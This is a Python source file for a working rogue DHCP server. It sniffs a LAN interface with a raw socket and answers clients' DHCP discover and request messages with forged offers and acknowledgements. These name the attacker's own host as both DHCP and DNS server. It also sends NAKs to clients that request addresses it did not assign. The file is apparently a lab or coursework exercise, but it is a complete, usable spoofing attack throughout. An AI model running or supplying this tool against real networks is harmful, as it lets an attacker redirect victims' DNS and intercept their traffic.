import socket
import struct
import sys

from util.util import bytesToMac, computeChecksum

ETH_P_ALL = 0x0003
ETH_P_IP = 0x0800
ETH_P_SIZE = 65536
ETH_LEN = 14

# DHCP Operations
DHCP_OP_REQUEST = 1
DHCP_OP_REPLY = 2

# DHCP Message types
DHCPDISCOVER = 1
DHCPOFFER = 2
DHCPREQUEST = 3
DHCPDECLINE = 4
DHCPACK = 5
DHCPNAK = 6
DHCPRELEASE = 7
DHCPINFORM = 8

DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68

DHCP_UNICAST_MSG = 0x0000
DHCP_BROADCAST_MSG = 0x8000

MY_IP = '10.0.0.11'
DNS_IP = '10.0.0.11'
ROUTER_IP = '10.0.0.1'


def isIP(eth_packet: tuple) -> bool:
    return eth_packet[2] == ETH_P_IP


def decodeIP(eth_data: bytes) -> (str, str, bytes, bytes):
    ip = struct.unpack('!BBHHHBBH4s4s', eth_data[:20])
    ip_data = eth_data[20:]

    src = socket.inet_ntoa(ip[8])
    dest = socket.inet_ntoa(ip[9])
    proto = ip[6]

    return (src, dest, proto, ip_data)


def isUDP(ip_proto: int) -> bool:
    return ip_proto == 17


def decodeUDP(ip_data: bytes) -> (bytes, bytes, int, bytes):
    udp = struct.unpack('!HHHH', ip_data[:8])
    udp_data = ip_data[8:]

    psrc = udp[0]
    pdst = udp[1]
    length = udp[2]

    return (psrc, pdst, length, udp_data)


def isDHCP(psrc: int, pdst: int) -> bool:
    return psrc == DHCP_CLIENT_PORT and pdst == DHCP_SERVER_PORT \
        or psrc == DHCP_SERVER_PORT and pdst == DHCP_CLIENT_PORT


def decodeDHCPOptions(opts: bytes) -> list:
    pos = 0
    res = []

    while True:
        if pos >= len(opts):
            break

        # [ opt1, size1, val1, opt2, size2, val2, opt3, size3, val3, ... ]
        byte_opt = struct.unpack('!BB', opts[pos:pos+2])
        if byte_opt[0] == 0xff:
            break

        pos += 2
        optVal = struct.unpack(
            '!{}s'.format(byte_opt[1]),
            opts[pos:pos+byte_opt[1]],
        )
        pos += byte_opt[1]

        if byte_opt[0] == 53:
            optVal = (ord(optVal[0]),)

        res.append((byte_opt[0], byte_opt[1], optVal[0]))

    return res


def getDHCPMessageType(opts: list) -> int:
    for v in opts:
        if v[0] == 53:
            return v[2]

    return 0


def getDHCPOption(opts: list, code: int) -> any:
    for v in opts:
        if v[0] == code:
            return v[2]


def isMe(opts: list) -> bool:
    myByteIp = socket.inet_aton(MY_IP)
    for v in opts:
        if v[0] == 54:
            return v[2] == myByteIp

    return False


def hasRequestedIP(opts: list) -> bool:
    for v in opts:
        if v[0] == 50 and \
            socket.inet_ntoa(v[2]) not in offeredIPs and \
                socket.inet_ntoa(v[2]) not in usedIPs:
            return True
    return False


def decodeDHCP(udp_data: bytes) -> (dict, bytes):
    dhcp = struct.unpack('!BBBBIHHIIII16s64s128sI', udp_data[:240])
    dhcp_data = udp_data[240:]

    def format_addr(x): return socket.inet_ntoa(struct.pack('!I', x))

    hlen = dhcp[2]
    d = {
        'op': dhcp[0],
        'htype': dhcp[1],
        'hlen': hlen,
        'hops': dhcp[3],
        'xid': dhcp[4],
        'secs': dhcp[5],
        'flags': dhcp[6],
        'ciaddr': format_addr(dhcp[7]),
        'yiaddr': format_addr(dhcp[8]),
        'siaddr': format_addr(dhcp[9]),
        'giaddr': format_addr(dhcp[10]),
        'chaddr': bytesToMac(dhcp[11][:hlen]),
        'sname': dhcp[12],
        'filename': dhcp[13],
        'magic': dhcp[14],
        'opts': decodeDHCPOptions(dhcp_data),
    }

    return (d, dhcp_data)

# ------------------------------------------------------------------------
# DHCP Spoofing area :D
# ------------------------------------------------------------------------


offeredIPs = []  # ip as a string
usedIPs = []  # ip as a string
usedSuffixes = []
maxIP = 126
minIP = 100


def getLooseIP() -> str:
    ip = None

    if len(usedSuffixes):
        lastSuff = usedSuffixes[len(usedSuffixes)-1]

        if lastSuff:
            ip = lastSuff + 1
        else:
            ip = minIP

        if ip > maxIP:
            ip = ''
    else:
        ip = minIP

    return '10.0.0.' + str(ip)


def addUsedSuffix(ip: str) -> None:
    ipSplit = ip.split('.')
    ipSuffix = int(ipSplit[len(ipSplit)-1])

    if not ipSuffix in usedSuffixes:
        usedSuffixes.append(ipSuffix)


def getZeroList(s: int):
    l = []
    for si in range(s):
        l.append(0x0)
    return l


def getSpoofedDHCP(props: dict) -> bytes:
    dhcp = struct.pack(
        '!B B B B I H H 4s 4s 4s 4s 16s 64s 128s I',
        props['op'],  # operation
        0x01,  # type
        6,  # hlen | only one MAC address
        0x00,  # hops
        props['xid'],  # xid
        0x0000,  # secs
        props['flags'],  # flags
        props['ciaddr'],
        props['yiaddr'],
        props['siaddr'],
        props['giaddr'],
        props['client_mac']+bytearray(getZeroList(10)),  # chaddr
        bytearray(getZeroList(64)),  # sname
        bytearray(getZeroList(128)),  # file
        0x63825363,
    )

    # start opts
    opts = b''
    infoKeys = props.keys()

    if 'opt_msg_type' in infoKeys:
        opts += struct.pack('!BBB', 53, 1, props['opt_msg_type'])
    if 'opt_subnet_mask' in infoKeys:
        opts += struct.pack('!BB4s', 1, 4, props['opt_subnet_mask'])
    if 'opt_router_ip' in infoKeys:
        opts += struct.pack('!BB4s', 3, 4, props['opt_router_ip'])
    if 'opt_dns_server' in infoKeys:
        opts += struct.pack('!BB4s', 6, 4, props['opt_dns_server'])
    if 'opt_lease' in infoKeys:
        opts += struct.pack('!BBI', 51, 4, props['opt_lease'])
    if 'opt_server_id' in infoKeys:
        opts += struct.pack('!BB4s', 54, 4, props['opt_server_id'])

    # end opts
    opts += struct.pack('!B15x', 0xff)

    return dhcp + opts


def getSpoofedDHCPOffer(data) -> bytes:
    client_mac = data['eth'][1]
    offeredIP = getLooseIP()

    dhcpProps = {
        'op': DHCP_OP_REPLY,
        'xid': data['dhcp']['xid'],
        'flags': data['dhcp']['flags'],
        'ciaddr': socket.inet_aton('0.0.0.0'),
        'yiaddr': socket.inet_aton(offeredIP),
        'siaddr': socket.inet_aton(MY_IP),
        'giaddr': socket.inet_aton(ROUTER_IP),
        'client_mac': client_mac,
        'opt_msg_type': DHCPOFFER,
        'opt_subnet_mask': socket.inet_aton('255.255.255.0'),
        'opt_router_ip': socket.inet_aton(ROUTER_IP),
        'opt_dns_server': socket.inet_aton(DNS_IP),
        'opt_lease': 36000,
        'opt_server_id': socket.inet_aton(MY_IP),
    }

    return (getSpoofedDHCP(dhcpProps), offeredIP)


def sendDHCPOfferSpoofed(sock: socket, data) -> None:
    (offer, offeredIP) = getSpoofedDHCPOffer(data)
    dhcpFlags = data['dhcp']['flags']

    ipDaddr = '255.255.255.255'
    if dhcpFlags == DHCP_UNICAST_MSG:
        ipDaddr = offeredIP

    ipDaddr = socket.inet_aton(ipDaddr)
    ipSaddr = socket.inet_aton(MY_IP)

    udpSport = 67
    udpDport = 68
    udpLen = struct.calcsize('!HHHH')+len(offer)
    udpChecksum = 0
    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)

    pseudo_h = struct.pack(
        '!4s4sBBH',
        ipSaddr,
        ipDaddr,
        0,
        socket.IPPROTO_UDP,
        udpLen,
    )

    # * get the checksum with pseudo header + udp header + dhcp offer packet
    udpChecksum = computeChecksum(pseudo_h+udp_h+offer)
    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)

    ipVersion = 4
    ipHlen = 5
    ipTOS = 0
    ipTotLen = 0
    ipID = 1
    ipFrag = 0
    ipTTL = 255
    ipProto = socket.IPPROTO_UDP
    ipChecksum = 0
    ipHlenVersion = (ipVersion << 4) + ipHlen

    ip_h = struct.pack(
        '!BBHHHBBH4s4s',
        ipHlenVersion,
        ipTOS,
        ipTotLen,
        ipID,
        ipFrag,
        ipTTL,
        ipProto,
        ipChecksum,
        ipSaddr,
        ipDaddr
    )

    ipChecksum = computeChecksum(ip_h)
    ip_h = struct.pack(
        '!BBHHHBBH4s4s',
        ipHlenVersion,
        ipTOS,
        ipTotLen,
        ipID,
        ipFrag,
        ipTTL,
        ipProto,
        ipChecksum,
        ipSaddr,
        ipDaddr
    )

    dest_mac = data['eth'][1]
    src_mac = data['eth'][0]
    eht_h = struct.pack(
        '!6s6sH',
        dest_mac,
        b'\x00\x00\x00\xaa\x00\x03',
        ETH_P_IP,
    )

    npacket = eht_h+ip_h+udp_h+offer

    sock.send(npacket)
    if offeredIP not in offeredIPs:
        offeredIPs.append(offeredIP)


def getSpoofedDHCPAck(data, isNack: bool = False) -> bytes:
    client_mac = data['eth'][1]
    yiaddr = getDHCPOption(data['dhcp']['opts'], 50)

    dhcpProps = {
        'op': DHCP_OP_REPLY,
        'xid': data['dhcp']['xid'],
        'flags': data['dhcp']['flags'],
        'ciaddr': socket.inet_aton('0.0.0.0'),
        'yiaddr': yiaddr,
        'siaddr': socket.inet_aton(MY_IP),
        'giaddr': socket.inet_aton(ROUTER_IP),
        'client_mac': client_mac,
        'opt_msg_type': DHCPNAK if isNack else DHCPACK,
        'opt_subnet_mask': socket.inet_aton('255.255.255.0'),
        'opt_router_ip': socket.inet_aton(ROUTER_IP),
        'opt_dns_server': socket.inet_aton(DNS_IP),
        'opt_lease': 36000,
        'opt_server_id': socket.inet_aton(MY_IP),
    }

    return (
        getSpoofedDHCP(dhcpProps),
        socket.inet_ntoa(yiaddr) if not isNack else None,
    )


def sendDHCPAckSpoofed(sock: socket, data, isNack: bool = False) -> None:
    (ack, usedIP) = getSpoofedDHCPAck(data, isNack)
    dhcpFlags = data['dhcp']['flags']

    ipDaddr = '255.255.255.255'
    if dhcpFlags == DHCP_UNICAST_MSG:
        ipDaddr = usedIP if usedIP else '255.255.255.255'

    ipDaddr = socket.inet_aton(ipDaddr)
    ipSaddr = socket.inet_aton(MY_IP)

    udpSport = 67
    udpDport = 68
    udpLen = struct.calcsize('!HHHH')+len(ack)
    udpChecksum = 0
    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)

    pseudo_h = struct.pack(
        '!4s4sBBH',
        ipSaddr,
        ipDaddr,
        0,
        socket.IPPROTO_UDP,
        udpLen,
    )

    # * get the checksum with pseudo header + udp header + dhcp offer packet
    udpChecksum = computeChecksum(pseudo_h+udp_h+ack)
    udp_h = struct.pack('!HHHH', udpSport, udpDport, udpLen, udpChecksum)

    ipVersion = 4
    ipHlen = 5
    ipTOS = 0
    ipTotLen = 0
    ipID = 1
    ipFrag = 0
    ipTTL = 255
    ipProto = socket.IPPROTO_UDP
    ipChecksum = 0
    ipHlenVersion = (ipVersion << 4) + ipHlen
    ip_h = struct.pack(
        '!BBHHHBBH4s4s',
        ipHlenVersion,
        ipTOS,
        ipTotLen,
        ipID,
        ipFrag,
        ipTTL,
        ipProto,
        ipChecksum,
        ipSaddr,
        ipDaddr
    )

    ipChecksum = computeChecksum(ip_h)
    ip_h = struct.pack(
        '!BBHHHBBH4s4s',
        ipHlenVersion,
        ipTOS,
        ipTotLen,
        ipID,
        ipFrag,
        ipTTL,
        ipProto,
        ipChecksum,
        ipSaddr,
        ipDaddr
    )

    dest_mac = data['eth'][1]
    src_mac = data['eth'][0]
    eht_h = struct.pack(
        '!6s6sH',
        dest_mac,
        b'\x00\x00\x00\xaa\x00\x03',
        ETH_P_IP,
    )

    npacket = eht_h+ip_h+udp_h+ack

    sock.send(npacket)
    if usedIP and not usedIP in usedIPs:
        addUsedSuffix(usedIP)
        usedIPs.append(usedIP)


# ------------------------------------------------------------------------
# End DHCP Spoofing
# ------------------------------------------------------------------------


def spoof(s: socket) -> None:
    while True:
        (packet, addr) = s.recvfrom(ETH_P_SIZE)

        eth_header = packet[:ETH_LEN]
        eth_data = packet[ETH_LEN:]
        eth = struct.unpack('!6s6sH', eth_header)

        print('\nMAC src:', bytesToMac(eth[1]))
        print('MAC dst:', bytesToMac(eth[0]))
        print('eth type:', hex(eth[2]))

        if isIP(eth):
            (ip_s, ip_d, ip_p, ip_data) = decodeIP(eth_data)
            print('IP Src:', ip_s)
            print('IP Dest:', ip_d)
            print('IP Proto:', ip_p)

            if isUDP(ip_p):
                (psrc, pdst, plen, udp_data) = decodeUDP(ip_data)
                print('UDP p_src:', psrc)
                print('UDP p_dst:', pdst)
                print('UDP len:', plen)

                if isDHCP(psrc, pdst):
                    print('IPs...', offeredIPs)
                    print('used', usedIPs)
                    print('suff', usedSuffixes)
                    (dhcp, dhcp_data) = decodeDHCP(udp_data)
                    # print('DHCP:', dhcp)
                    print('DHCP xid', hex(dhcp['xid']))

                    dhcpToSpoof = {
                        'eth': eth,
                        'ip': {
                            'ip_s': ip_s,
                            'ip_d': ip_d,
                        },
                        'udp': {
                            'psrc': psrc,
                            'pdst': pdst,
                        },
                        'dhcp': dhcp,
                    }

                    msgType = getDHCPMessageType(dhcp['opts'])
                    print('DHCP Message Type', msgType)

                    hasReqId = hasRequestedIP(dhcp['opts'])

                    if msgType == DHCPDISCOVER:
                        print('DHCP discover')
                        if hasReqId:
                            print('DHCP has Requested IP')
                            sendDHCPAckSpoofed(s, dhcpToSpoof, True)
                        sendDHCPOfferSpoofed(s, dhcpToSpoof)
                    elif msgType == DHCPREQUEST:
                        print('DHCP request')
                        if isMe(dhcp['opts']):
                            if hasReqId:
                                sendDHCPAckSpoofed(s, dhcpToSpoof, True)
                            else:
                                sendDHCPAckSpoofed(s, dhcpToSpoof)
                    else:
                        print('Don\'t know this one :/')


if __name__ == "__main__":
    print('running...')
    try:
        s = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.ntohs(ETH_P_ALL))
    except OSError as e:
        print('error creating the sniff socket', e)
        sys.exit(1)

    print('AF_PACKET sock created')
    s.bind(('eth0', 0))

    try:
        # The magic will happen
        spoof(s)
    except KeyboardInterrupt:
        print('exiting...')
